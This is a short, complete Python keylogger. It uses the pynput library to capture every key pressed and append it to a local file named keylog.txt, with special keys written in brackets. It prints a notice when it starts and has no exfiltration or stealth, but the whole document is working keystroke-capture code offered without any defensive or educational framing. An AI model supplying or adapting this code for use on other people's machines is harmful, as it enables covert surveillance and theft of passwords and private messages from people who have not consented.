from pynput import keyboard

# File to save the keystrokes
LOG_FILE = "keylog.txt"

# Callback function to handle key presses
def on_press(key):
    try:
        # Save the key to the log file
        with open(LOG_FILE, "a") as file:
            if hasattr(key, 'char') and key.char:
                file.write(key.char)
            else:
                file.write(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

# Function to start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    print(f"Keylogger running. Logs will be saved in {LOG_FILE}")
    start_keylogger()
